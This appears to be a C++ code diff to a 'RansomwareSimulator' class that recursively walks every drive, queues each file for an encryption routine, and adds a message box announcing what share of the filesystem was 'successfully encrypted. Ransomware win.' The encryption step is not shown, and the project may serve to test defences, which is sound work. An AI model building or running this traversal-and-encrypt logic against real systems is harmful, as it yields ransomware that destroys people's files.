@@ -33,16 +33,23 @@ namespace maltech {
                     path += disk;
                     path += ":\\*";
                     try {
-                        PrintCatalogue(path);
+                        ProcessCatalogue(path);
                     }
                     catch (const std::exception& e) {
                         LOG_ERROR("Encrypting error: "s + e.what());
                     }
                 }
             }
+            double crypted_persentege = crypted_count_ / files_count_ * 100;
+            std::ostringstream strm;
+            strm << std::setprecision(2)
+                << crypted_persentege
+                << "% of your filesystem "
+                "successfully encrypted. Ransomware win.";
+            MessageBoxA(NULL, strm.str().data(), "Result", MB_OK);
         }
 
-        void RansomwareSimulator::PrintCatalogue(std::string_view path) {
+        void RansomwareSimulator::ProcessCatalogue(std::string_view path) {
             WIN32_FIND_DATA data{ 0 };
             HANDLE hDirEntry = FindFirstFileA(path.data(), &data);
             if (!hDirEntry || hDirEntry == INVALID_HANDLE_VALUE) {
@@ -63,7 +70,7 @@ namespace maltech {
                 LOG_INFO(full_path);
                 if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                     try {
-                        PrintCatalogue(
+                        ProcessCatalogue(
                             std::string(path.substr(0, path.size() - 1))
                             + data.cFileName + "\\*");
                     }
@@ -72,6 +79,7 @@ namespace maltech {
                     }
                 }
                 else {
+                    ++files_count_;
                     thread_pool_
                         .AddTask([self = shared_from_this(), path = std::move(full_path)]() {
                         self->ImitateFileIncryption(path);
@@ -85,6 +93,7 @@ namespace maltech {
             try {
                 HANDLE hFile = OpenFile(path);
                 ProcessFileEncrypting(hFile);
+                ++crypted_count_;
             }
             catch (const std::exception& e) {
                 LOG_ERROR(e.what());
